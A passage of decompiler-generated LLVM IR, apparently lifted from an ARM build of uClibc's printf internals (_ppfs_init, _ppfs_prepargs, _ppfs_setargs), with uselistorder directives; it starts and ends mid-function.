  store i32 %v3_112b0182, i32* %r3.global-to-local, align 4
  %v2_112b4183 = icmp eq i8 %v2_112b0181, 0
  br i1 %v2_112b4183, label %dec_label_pc_112cc, label %bb126

dec_label_pc_11800:                               ; preds = %dec_label_pc_1130c
  %v1_11800 = add i32 %v0_11314, 2
  store i32 %v1_11800, i32* @r4, align 4
  br label %dec_label_pc_112b0.outer

dec_label_pc_11808:                               ; preds = %dec_label_pc_11678, %dec_label_pc_117dc, %.thread36, %dec_label_pc_11728, %dec_label_pc_1170c, %dec_label_pc_115dc, %bb162, %dec_label_pc_11540, %bb130, %dec_label_pc_117b8
  br label %dec_label_pc_11810

dec_label_pc_11810:                               ; preds = %dec_label_pc_11300, %bb, %dec_label_pc_11280, %dec_label_pc_11808
  %stack_var_-336.5 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_11280 ], [ -1, %dec_label_pc_11808 ], [ %stack_var_-336.2, %dec_label_pc_11300 ]
  store i32 %stack_var_-336.5, i32* %r0.global-to-local, align 4
  store i32 %v6_1123c, i32* @r5, align 4
  store i32 %v15_1123c, i32* @r8, align 4
  store i32 %v18_1123c, i32* @sb, align 4
  store i32 %v21_1123c, i32* @sl, align 4
  store i32 %v24_1123c, i32* @fp, align 4
  ret i32 %stack_var_-336.5

; uselistorder directives
  uselistorder i32 %stack_var_-336.5, { 1, 0 }
  uselistorder i32 %v1_11800, { 1, 0 }
  uselistorder i8 %v2_112b0181, { 1, 2, 0 }
  uselistorder i32 %v0_112b049, { 2, 0, 1 }
  uselistorder i32 %v5_112dc, { 2, 3, 1, 0 }
  uselistorder i32 %v0_113dc, { 9, 12, 13, 2, 10, 8, 11, 6, 5, 4, 1, 0, 7, 3, 15, 14 }
  uselistorder i32 %v0_117f8, { 1, 0, 2 }
  uselistorder i32 %v1_1178c, { 2, 1, 0 }
  uselistorder i32 %v0_11794, { 1, 0, 2, 3 }
  uselistorder i32 %v0_11714, { 1, 0 }
  uselistorder i32 %v2_116f8, { 2, 0, 1 }
  uselistorder i1 %v3_116d8, { 1, 0 }
  uselistorder i32 %v0_116e8, { 0, 2, 3, 1 }
  uselistorder i32 %v2_116bc, { 1, 0 }
  uselistorder i32 %v0_11700, { 1, 0, 2 }
  uselistorder i32 %v3_11690, { 1, 2, 0 }
  uselistorder i32 %v0_11640, { 1, 0 }
  uselistorder i32 %v2_11624, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_115ec, { 1, 2, 0, 3 }
  uselistorder i32 %v0_115b8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_114bc, { 3, 2, 0, 4, 1, 5 }
  uselistorder i32 %v0_114d8, { 1, 2, 3, 0 }
  uselistorder i32 %v6_11458, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_113bc, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_1136c.pre, { 2, 1, 0 }
  uselistorder i32 %v1_11364, { 1, 0 }
  uselistorder i32 %v1_1130c, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-336.2, { 0, 8, 6, 1, 2, 5, 4, 3, 7 }
  uselistorder i32 %v2_112cc, { 1, 0 }
  uselistorder i32 %v1_112c4.lcssa, { 1, 0 }
  uselistorder i8 %v2_112b0, { 1, 2, 0 }
  uselistorder i32 %v2_112c4, { 1, 2, 3, 0 }
  uselistorder i1 %v7_114d0, { 1, 0 }
  uselistorder i1 %v7_1141c, { 1, 2, 0 }
  uselistorder i1 %v7_11614, { 1, 0 }
  uselistorder i1 %v7_11574, { 1, 0 }
  uselistorder i1 %v7_11460, { 1, 0 }
  uselistorder i32 %v2_115b4, { 0, 2, 1, 3 }
  uselistorder i32 %v2_11684, { 3, 2, 5, 4, 11, 10, 9, 7, 8, 6, 1, 0 }
  uselistorder i32* %v1_11394, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_11368, { 2, 4, 3, 5, 0, 1 }
  uselistorder i32 %v2_11348, { 1, 2, 0 }
  uselistorder i32 %v4_11340, { 1, 0 }
  uselistorder i32 %v2_11244, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-332, { 2, 1, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-328, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %tmp103, { 2, 1, 0 }
  uselistorder i32 %tmp102, { 19, 18, 15, 13, 8, 9, 0, 10, 12, 11, 3, 4, 5, 6, 7, 1, 2, 17, 16, 14 }
  uselistorder i32 %tmp101, { 6, 5, 3, 2, 0, 4, 1 }
  uselistorder i32 %tmp97, { 2, 1, 3, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 5, 6, 3, 4, 7, 8, 2, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 1, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r2.global-to-local, { 24, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 2, 22, 23, 25, 26, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 7, 6, 9, 8, 10, 12, 14, 13, 16, 15, 17, 18, 21, 19, 20, 23, 22, 25, 24, 27, 26, 29, 28, 33, 30, 31, 32, 0, 34, 35, 36, 37, 1, 11, 39, 38, 41, 40, 43, 42, 45, 44, 2 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder label %dec_label_pc_11810, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_11808, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_117f8, { 1, 0 }
  uselistorder label %dec_label_pc_117b8, { 1, 0 }
  uselistorder label %.thread36, { 1, 0 }
  uselistorder label %dec_label_pc_11728, { 1, 0 }
  uselistorder label %.thread29, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %dec_label_pc_116d4, { 1, 0 }
  uselistorder label %dec_label_pc_116b8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_116b8thread-pre-split, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_116ac, { 1, 0 }
  uselistorder label %dec_label_pc_1169c, { 0, 2, 1 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %dec_label_pc_11630, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb159, { 1, 0 }
  uselistorder label %bb157, { 4, 1, 2, 0, 3 }
  uselistorder label %bb154, { 1, 0 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 4, 3, 1, 0, 2 }
  uselistorder label %bb145, { 1, 0 }
  uselistorder label %dec_label_pc_1140c, { 1, 0 }
  uselistorder label %dec_label_pc_11408, { 2, 1, 0 }
  uselistorder label %bb139, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11360, { 1, 0 }
  uselistorder label %bb134, { 1, 0 }
  uselistorder label %dec_label_pc_11300, { 1, 0 }
  uselistorder label %bb130, { 1, 0 }
  uselistorder label %dec_label_pc_112cc, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_11830 = load i32, i32* @r4, align 4
  store i32 %v3_11830, i32* %stack_var_-12, align 4
  %v6_11830 = load i32, i32* @r5, align 4
  store i32 152, i32* @r2, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_1183c = load i32, i32* @r1, align 4
  store i32 %v0_1183c, i32* @r5, align 4
  store i32 0, i32* @r1, align 4
  %v0_11844 = call i32 @__GI_memset()
  %v0_11848 = load i32, i32* @r4, align 4
  %v1_11848 = add i32 %v0_11848, 24
  %v2_11848 = inttoptr i32 %v1_11848 to i32*
  %v3_11848 = load i32, i32* %v2_11848, align 4
  %v1_1184c = add i32 %v3_11848, -1
  store i32 %v1_1184c, i32* %v2_11848, align 4
  %v0_11854 = load i32, i32* @r5, align 4
  %v1_11854 = load i32, i32* @r4, align 4
  %v2_11854 = inttoptr i32 %v1_11854 to i32*
  store i32 %v0_11854, i32* %v2_11854, align 4
  %v0_11858 = load i32, i32* @r4, align 4
  %v1_11858 = add i32 %v0_11858, 40
  store i32 %v1_11858, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v2_1186819 = inttoptr i32 %v1_11858 to i32*
  store i32 8, i32* %v2_1186819, align 4
  %v3_1186820 = load i32, i32* %r1.global-to-local, align 4
  %v4_1186821 = add i32 %v3_1186820, 4
  store i32 %v4_1186821, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11860.dec_label_pc_11860_crit_edge

dec_label_pc_11860.dec_label_pc_11860_crit_edge:  ; preds = %entry, %dec_label_pc_11860.dec_label_pc_11860_crit_edge
  %v4_1186822 = phi i32 [ %v4_1186821, %entry ], [ %v4_11868, %dec_label_pc_11860.dec_label_pc_11860_crit_edge ]
  %v0_11864.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_11864 = add i32 %v0_11864.pre, -1
  store i32 %v1_11864, i32* %r2.global-to-local, align 4
  %v7_11864 = icmp eq i32 %v0_11864.pre, 1
  %v2_11868 = inttoptr i32 %v4_1186822 to i32*
  store i32 8, i32* %v2_11868, align 4
  %v3_11868 = load i32, i32* %r1.global-to-local, align 4
  %v4_11868 = add i32 %v3_11868, 4
  store i32 %v4_11868, i32* %r1.global-to-local, align 4
  br i1 %v7_11864, label %dec_label_pc_11870, label %dec_label_pc_11860.dec_label_pc_11860_crit_edge

dec_label_pc_11870:                               ; preds = %dec_label_pc_11860.dec_label_pc_11860_crit_edge
  %v0_11870 = load i32, i32* @r5, align 4
  store i32 %v0_11870, i32* %r2.global-to-local, align 4
  %v1_118b43 = inttoptr i32 %v0_11870 to i8*
  %v2_118b44 = load i8, i8* %v1_118b43, align 1
  %v2_118b86 = icmp eq i8 %v2_118b44, 0
  br i1 %v2_118b86, label %dec_label_pc_118c0, label %dec_label_pc_11880

dec_label_pc_11878:                               ; preds = %dec_label_pc_11898
  %v2_1187c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1187c, i32* @r4, align 4
  store i32 %v6_11830, i32* @r5, align 4
  ret i32 -1

dec_label_pc_11880:                               ; preds = %dec_label_pc_11870, %dec_label_pc_118b4.backedge
  %v0_11888 = phi i32 [ %storemerge, %dec_label_pc_118b4.backedge ], [ %v0_11870, %dec_label_pc_11870 ]
  %v2_118b47 = phi i8 [ %v2_118b4, %dec_label_pc_118b4.backedge ], [ %v2_118b44, %dec_label_pc_11870 ]
  %v7_11880 = icmp eq i8 %v2_118b47, 37
  br i1 %v7_11880, label %dec_label_pc_11888, label %dec_label_pc_118b0

dec_label_pc_11888:                               ; preds = %dec_label_pc_11880
  %v1_11888 = add i32 %v0_11888, 1
  %v2_11888 = inttoptr i32 %v1_11888 to i8*
  %v3_11888 = load i8, i8* %v2_11888, align 1
  store i32 %v1_11888, i32* %r2.global-to-local, align 4
  %v7_1188c = icmp eq i8 %v3_11888, 37
  br i1 %v7_1188c, label %dec_label_pc_118b0, label %dec_label_pc_11898

dec_label_pc_11898:                               ; preds = %dec_label_pc_11888
  %v0_11890 = load i32, i32* @r4, align 4
  %v2_11898 = inttoptr i32 %v0_11890 to i32*
  store i32 %v1_11888, i32* %v2_11898, align 4
  %v2_1189c = call i32 @_ppfs_parsespec(i32* %v2_11898)
  %v1_118a0 = icmp slt i32 %v2_1189c, 0
  br i1 %v1_118a0, label %dec_label_pc_11878, label %dec_label_pc_118a8

dec_label_pc_118a8:                               ; preds = %dec_label_pc_11898
  %v0_118a8 = load i32, i32* @r4, align 4
  %v1_118a8 = inttoptr i32 %v0_118a8 to i32*
  %v2_118a8 = load i32, i32* %v1_118a8, align 4
  br label %dec_label_pc_118b4.backedge

dec_label_pc_118b0:                               ; preds = %dec_label_pc_11880, %dec_label_pc_11888
  %v0_118b0 = phi i32 [ %v0_11888, %dec_label_pc_11880 ], [ %v1_11888, %dec_label_pc_11888 ]
  %v1_118b0 = add i32 %v0_118b0, 1
  br label %dec_label_pc_118b4.backedge

dec_label_pc_118b4.backedge:                      ; preds = %dec_label_pc_118b0, %dec_label_pc_118a8
  %storemerge = phi i32 [ %v1_118b0, %dec_label_pc_118b0 ], [ %v2_118a8, %dec_label_pc_118a8 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_118b4 = inttoptr i32 %storemerge to i8*
  %v2_118b4 = load i8, i8* %v1_118b4, align 1
  %v2_118b8 = icmp eq i8 %v2_118b4, 0
  br i1 %v2_118b8, label %dec_label_pc_118b4.dec_label_pc_118c0_crit_edge, label %dec_label_pc_11880

dec_label_pc_118b4.dec_label_pc_118c0_crit_edge:  ; preds = %dec_label_pc_118b4.backedge
  %v0_118c0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_118c0

dec_label_pc_118c0:                               ; preds = %dec_label_pc_118b4.dec_label_pc_118c0_crit_edge, %dec_label_pc_11870
  %v0_118c0 = phi i32 [ %v0_118c0.pre, %dec_label_pc_118b4.dec_label_pc_118c0_crit_edge ], [ %v0_11870, %dec_label_pc_11870 ]
  %v3_118b4.lcssa.in = phi i8 [ %v2_118b4, %dec_label_pc_118b4.dec_label_pc_118c0_crit_edge ], [ %v2_118b44, %dec_label_pc_11870 ]
  %v3_118b4.lcssa = zext i8 %v3_118b4.lcssa.in to i32
  %v1_118c0 = load i32, i32* @r4, align 4
  %v2_118c0 = inttoptr i32 %v1_118c0 to i32*
  store i32 %v0_118c0, i32* %v2_118c0, align 4
  %v2_118c4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_118c4, i32* @r4, align 4
  store i32 %v6_11830, i32* @r5, align 4
  ret i32 %v3_118b4.lcssa

; uselistorder directives
  uselistorder i8 %v2_118b4, { 0, 2, 1 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_11870, { 1, 0, 2, 3 }
  uselistorder i32 %v4_11868, { 1, 0 }
  uselistorder i32 %v0_11864.pre, { 1, 0 }
  uselistorder i32 %v6_11830, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 5, 4, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_118b0, { 1, 0 }
  uselistorder label %dec_label_pc_11880, { 1, 0 }
  uselistorder label %dec_label_pc_11860.dec_label_pc_11860_crit_edge, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_118c8 = load i32, i32* @r4, align 4
  store i32 %v3_118c8, i32* %stack_var_-12, align 4
  %v1_118cc = add i32 %arg1, 24
  %v2_118cc = inttoptr i32 %v1_118cc to i32*
  %v3_118cc = load i32, i32* %v2_118cc, align 4
  store i32 %v3_118cc, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_118dc = add i32 %arg1, 76
  %v3_118dc = inttoptr i32 %v2_118dc to i32*
  store i32 %arg2, i32* %v3_118dc, align 4
  %v7_118e0 = icmp sgt i32 %v3_118cc, 0
  br i1 %v7_118e0, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v10_118e0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v10_118e0, i32* @r4, align 4
  ret i32 %arg1

bb4:                                              ; preds = %entry
  %v0_118e4 = load i32, i32* %r3.global-to-local, align 4
  %v2_118e4 = add i32 %arg1, 8
  %v3_118e4 = inttoptr i32 %v2_118e4 to i32*
  store i32 %v0_118e4, i32* %v3_118e4, align 4
  %v0_118e8 = load i32, i32* %r5.global-to-local, align 4
  %v2_118e8 = add i32 %arg1, 28
  %v3_118e8 = inttoptr i32 %v2_118e8 to i32*
  store i32 %v0_118e8, i32* %v3_118e8, align 4
  %v0_118ec = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_118ec, i32* %v2_118cc, align 4
  %v0_118f0 = load i32, i32* %r3.global-to-local, align 4
  %v2_118f0 = add i32 %arg1, 4
  %v3_118f0 = inttoptr i32 %v2_118f0 to i32*
  store i32 %v0_118f0, i32* %v3_118f0, align 4
  %v0_118f4 = call i32 @_ppfs_setargs()
  %v0_118f8 = load i32, i32* %r5.global-to-local, align 4
  %v1_118f8 = load i32, i32* @r4, align 4
  %v2_118f8 = add i32 %v1_118f8, 24
  %v3_118f8 = inttoptr i32 %v2_118f8 to i32*
  store i32 %v0_118f8, i32* %v3_118f8, align 4
  %v2_118fc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_118fc, i32* @r4, align 4
  ret i32 %v0_118f4

; uselistorder directives
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 5, 4, 6, 2, 1, 3, 7 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_11900 = load i32, i32* @r0, align 4
  %v1_11900 = add i32 %v0_11900, 24
  %v2_11900 = inttoptr i32 %v1_11900 to i32*
  %v3_11900 = load i32, i32* %v2_11900, align 4
  store i32 %v3_11900, i32* %r1.global-to-local, align 4
  %v2_11904 = icmp eq i32 %v3_11900, 0
  %v3_11908 = load i32, i32* @r4, align 4
  store i32 %v3_11908, i32* %stack_var_-8, align 4
  %v1_1190c = add i32 %v0_11900, 80
  store i32 %v1_1190c, i32* %ip.global-to-local, align 4
  %v1_11910 = add i32 %v0_11900, 8
  %v2_11910 = inttoptr i32 %v1_11910 to i32*
  %v3_11910 = load i32, i32* %v2_11910, align 4
  store i32 %v3_11910, i32* %r3.global-to-local, align 4
  %v6_11918 = icmp eq i32 %v3_11910, -2147483648
  br i1 %v2_11904, label %dec_label_pc_11918, label %dec_label_pc_11a3c

dec_label_pc_11918:                               ; preds = %entry
  br i1 %v6_11918, label %dec_label_pc_11920, label %dec_label_pc_11938

dec_label_pc_11920:                               ; preds = %dec_label_pc_11918
  %v1_11920 = add i32 %v0_11900, 76
  %v2_11920 = inttoptr i32 %v1_11920 to i32*
  %v3_11920 = load i32, i32* %v2_11920, align 4
  store i32 %v3_11920, i32* %r3.global-to-local, align 4
  %v1_11924 = inttoptr i32 %v3_11920 to i32*
  %v2_11924 = load i32, i32* %v1_11924, align 4
  store i32 %v2_11924, i32* %r2.global-to-local, align 4
  %v1_11928 = add i32 %v3_11920, 4
  store i32 %v1_11928, i32* %r3.global-to-local, align 4
  store i32 %v1_11928, i32* %v2_11920, align 4
  %v0_11930 = load i32, i32* %r2.global-to-local, align 4
  %v1_11930 = load i32, i32* @r0, align 4
  %v2_11930 = add i32 %v1_11930, 8
  %v3_11930 = inttoptr i32 %v2_11930 to i32*
  store i32 %v0_11930, i32* %v3_11930, align 4
  %v0_11934 = load i32, i32* %r2.global-to-local, align 4
  %v1_11934 = load i32, i32* @r0, align 4
  %v2_11934 = add i32 %v1_11934, 80
  %v3_11934 = inttoptr i32 %v2_11934 to i32*
  store i32 %v0_11934, i32* %v3_11934, align 4
  %v0_11938.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_11938

dec_label_pc_11938:                               ; preds = %dec_label_pc_11918, %dec_label_pc_11920
  %v1_11950 = phi i32 [ %v0_11900, %dec_label_pc_11918 ], [ %v0_11938.pre, %dec_label_pc_11920 ]
  %v1_11938 = add i32 %v1_11950, 4
  %v2_11938 = inttoptr i32 %v1_11938 to i32*
  %v3_11938 = load i32, i32* %v2_11938, align 4
  store i32 %v3_11938, i32* %r3.global-to-local, align 4
  %v6_1193c = icmp eq i32 %v3_11938, -2147483648
  br i1 %v6_1193c, label %dec_label_pc_11944, label %dec_label_pc_1195c

dec_label_pc_11944:                               ; preds = %dec_label_pc_11938
  %v1_11944 = add i32 %v1_11950, 76
  %v2_11944 = inttoptr i32 %v1_11944 to i32*
  %v3_11944 = load i32, i32* %v2_11944, align 4
  store i32 %v3_11944, i32* %r3.global-to-local, align 4
  %v1_11948 = inttoptr i32 %v3_11944 to i32*
  %v2_11948 = load i32, i32* %v1_11948, align 4
  store i32 %v2_11948, i32* %r2.global-to-local, align 4
  %v1_1194c = add i32 %v3_11944, 4
  store i32 %v1_1194c, i32* %r3.global-to-local, align 4
  store i32 %v1_1194c, i32* %v2_11944, align 4
  %v0_11954 = load i32, i32* %r2.global-to-local, align 4
  %v1_11954 = load i32, i32* @r0, align 4
  %v2_11954 = add i32 %v1_11954, 4
  %v3_11954 = inttoptr i32 %v2_11954 to i32*
  store i32 %v0_11954, i32* %v3_11954, align 4
  %v0_11958 = load i32, i32* %r2.global-to-local, align 4
  %v1_11958 = load i32, i32* @r0, align 4
  %v2_11958 = add i32 %v1_11958, 80
  %v3_11958 = inttoptr i32 %v2_11958 to i32*
  store i32 %v0_11958, i32* %v3_11958, align 4
  %v0_11a2c18.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1195c

dec_label_pc_1195c:                               ; preds = %dec_label_pc_11938, %dec_label_pc_11944
  %v0_11a2c18 = phi i32 [ %v1_11950, %dec_label_pc_11938 ], [ %v0_11a2c18.pre, %dec_label_pc_11944 ]
  %v0_1195c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_1195c, i32* %lr.global-to-local, align 4
  %v1_11a2c19 = add i32 %v0_11a2c18, 28
  %v2_11a2c20 = inttoptr i32 %v1_11a2c19 to i32*
  %v3_11a2c21 = load i32, i32* %v2_11a2c20, align 4
  store i32 %v3_11a2c21, i32* %r3.global-to-local, align 4
  %v5_11a3423 = icmp slt i32 %v0_1195c, %v3_11a2c21
  br i1 %v5_11a3423, label %dec_label_pc_11964, label %dec_label_pc_11a38.loopexit

dec_label_pc_11964:                               ; preds = %dec_label_pc_1195c, %dec_label_pc_11a28
  %v0_11a2c25 = phi i32 [ %v0_11a2c, %dec_label_pc_11a28 ], [ %v0_11a2c18, %dec_label_pc_1195c ]
  %v1_1196424 = phi i32 [ %v1_11a28, %dec_label_pc_11a28 ], [ %v0_1195c, %dec_label_pc_1195c ]
  %v4_11964 = mul i32 %v1_1196424, 4
  %v5_11964 = add i32 %v0_11a2c25, %v4_11964
  store i32 %v5_11964, i32* %r3.global-to-local, align 4
  %v1_11968 = add i32 %v5_11964, 40
  %v2_11968 = inttoptr i32 %v1_11968 to i32*
  %v3_11968 = load i32, i32* %v2_11968, align 4
  store i32 %v3_11968, i32* %r2.global-to-local, align 4
  %v7_1196c = icmp eq i32 %v3_11968, 8
  br i1 %v7_1196c, label %dec_label_pc_11a28, label %dec_label_pc_11974

dec_label_pc_11974:                               ; preds = %dec_label_pc_11964
  %v1_11974 = add i32 %v0_11a2c25, 76
  %v2_11974 = inttoptr i32 %v1_11974 to i32*
  %v3_11974 = load i32, i32* %v2_11974, align 4
  store i32 %v3_11974, i32* %r1.global-to-local, align 4
  %v8_11978 = icmp sgt i32 %v3_11968, 8
  br i1 %v8_11978, label %dec_label_pc_1199c, label %dec_label_pc_1197c

dec_label_pc_1197c:                               ; preds = %dec_label_pc_11974
  %v7_1197c = icmp eq i32 %v3_11968, 2
  br i1 %v7_1197c, label %dec_label_pc_119e8, label %dec_label_pc_11984

dec_label_pc_11984:                               ; preds = %dec_label_pc_1197c
  %v8_11984 = icmp sgt i32 %v3_11968, 2
  br i1 %v8_11984, label %dec_label_pc_11994, label %dec_label_pc_11988

dec_label_pc_11988:                               ; preds = %dec_label_pc_11984
  %v1_11988 = icmp slt i32 %v3_11968, 0
  br i1 %v1_11988, label %dec_label_pc_11a14, label %dec_label_pc_119e8

dec_label_pc_11994:                               ; preds = %dec_label_pc_11984
  %v7_11994 = icmp eq i32 %v3_11968, 7
  br i1 %v7_11994, label %dec_label_pc_119fc, label %dec_label_pc_11a14

dec_label_pc_1199c:                               ; preds = %dec_label_pc_11974
  %v7_1199c = icmp eq i32 %v3_11968, 1024
  br i1 %v7_1199c, label %dec_label_pc_119e8, label %dec_label_pc_119a4

dec_label_pc_119a4:                               ; preds = %dec_label_pc_1199c
  %v8_119a4 = icmp sgt i32 %v3_11968, 1024
  br i1 %v8_119a4, label %dec_label_pc_119bc, label %dec_label_pc_119a8

dec_label_pc_119a8:                               ; preds = %dec_label_pc_119a4
  switch i32 %v3_11968, label %dec_label_pc_11a14 [
    i32 256, label %dec_label_pc_119e8
    i32 512, label %dec_label_pc_119e8
  ]

dec_label_pc_119bc:                               ; preds = %dec_label_pc_119a4
  %v7_119bc = icmp eq i32 %v3_11968, 2048
  br i1 %v7_119bc, label %dec_label_pc_119d4, label %dec_label_pc_119cc

dec_label_pc_119cc:                               ; preds = %dec_label_pc_119bc
  store i32 2055, i32* %r3.global-to-local, align 4
  %v9_119c8 = icmp eq i32 %v3_11968, 2055
  br i1 %v9_119c8, label %dec_label_pc_119fc, label %dec_label_pc_11a14

dec_label_pc_119d4:                               ; preds = %dec_label_pc_119bc
  %v1_119d4 = add i32 %v3_11974, 8
  store i32 %v1_119d4, i32* %r3.global-to-local, align 4
  store i32 %v1_119d4, i32* %v2_11974, align 4
  %v0_119dc = load i32, i32* %r1.global-to-local, align 4
  %v1_119dc = inttoptr i32 %v0_119dc to i32*
  %v2_119dc = load i32, i32* %v1_119dc, align 4
  store i32 %v2_119dc, i32* %r3.global-to-local, align 4
  %v3_119dc = add i32 %v0_119dc, 4
  %v4_119dc = inttoptr i32 %v3_119dc to i32*
  %v5_119dc = load i32, i32* %v4_119dc, align 4
  store i32 %v5_119dc, i32* %r4.global-to-local, align 4
  %v0_119e0 = load i32, i32* %ip.global-to-local, align 4
  %v1_119e0 = inttoptr i32 %v0_119e0 to i32*
  store i32 %v2_119dc, i32* %v1_119e0, align 4
  %v3_119e0 = add i32 %v0_119e0, 4
  %v4_119e0 = inttoptr i32 %v3_119e0 to i32*
  %v5_119e0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_119e0, i32* %v4_119e0, align 4
  br label %dec_label_pc_11a24

dec_label_pc_119e8:                               ; preds = %dec_label_pc_119a8, %dec_label_pc_119a8, %dec_label_pc_11988, %dec_label_pc_1199c, %dec_label_pc_1197c
  %v1_119e8 = inttoptr i32 %v3_11974 to i32*
  %v2_119e8 = load i32, i32* %v1_119e8, align 4
  store i32 %v2_119e8, i32* %r2.global-to-local, align 4
  %v1_119ec = add i32 %v3_11974, 4
  store i32 %v1_119ec, i32* %r3.global-to-local, align 4
  store i32 %v1_119ec, i32* %v2_11974, align 4
  %v0_119f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_119f4 = load i32, i32* %ip.global-to-local, align 4
  %v2_119f4 = inttoptr i32 %v1_119f4 to i32*
  store i32 %v0_119f4, i32* %v2_119f4, align 4
  br label %dec_label_pc_11a24

dec_label_pc_119fc:                               ; preds = %dec_label_pc_11994, %dec_label_pc_119cc
  %v3_119fc = load i32, i32* %v2_11974, align 4
  store i32 %v3_119fc, i32* %r3.global-to-local, align 4
  %v1_11a00 = inttoptr i32 %v3_119fc to i32*
  %v2_11a00 = load i32, i32* %v1_11a00, align 4
  store i32 %v2_11a00, i32* %r1.global-to-local, align 4
  %v3_11a00 = add i32 %v3_119fc, 4
  %v4_11a00 = inttoptr i32 %v3_11a00 to i32*
  %v5_11a00 = load i32, i32* %v4_11a00, align 4
  store i32 %v5_11a00, i32* %r2.global-to-local, align 4
  %v1_11a04 = add i32 %v3_119fc, 8
  store i32 %v1_11a04, i32* %r3.global-to-local, align 4
  store i32 %v1_11a04, i32* %v2_11974, align 4
  %v0_11a0c = load i32, i32* %ip.global-to-local, align 4
  %v1_11a0c = inttoptr i32 %v0_11a0c to i32*
  %v2_11a0c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_11a0c, i32* %v1_11a0c, align 4
  %v3_11a0c = add i32 %v0_11a0c, 4
  %v4_11a0c = inttoptr i32 %v3_11a0c to i32*
  %v5_11a0c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_11a0c, i32* %v4_11a0c, align 4
  br label %dec_label_pc_11a24

dec_label_pc_11a14:                               ; preds = %dec_label_pc_119a8, %dec_label_pc_11994, %dec_label_pc_11988, %dec_label_pc_119cc
  %v1_11a14 = add i32 %v3_11974, 4
  store i32 %v1_11a14, i32* %r3.global-to-local, align 4
  store i32 %v1_11a14, i32* %v2_11974, align 4
  %v0_11a1c = load i32, i32* %r1.global-to-local, align 4
  %v1_11a1c = inttoptr i32 %v0_11a1c to i32*
  %v2_11a1c = load i32, i32* %v1_11a1c, align 4
  store i32 %v2_11a1c, i32* %r3.global-to-local, align 4
  %v1_11a20 = load i32, i32* %ip.global-to-local, align 4
  %v2_11a20 = inttoptr i32 %v1_11a20 to i32*
  store i32 %v2_11a1c, i32* %v2_11a20, align 4
  br label %dec_label_pc_11a24

dec_label_pc_11a24:                               ; preds = %dec_label_pc_119fc, %dec_label_pc_119e8, %dec_label_pc_119d4, %dec_label_pc_11a14
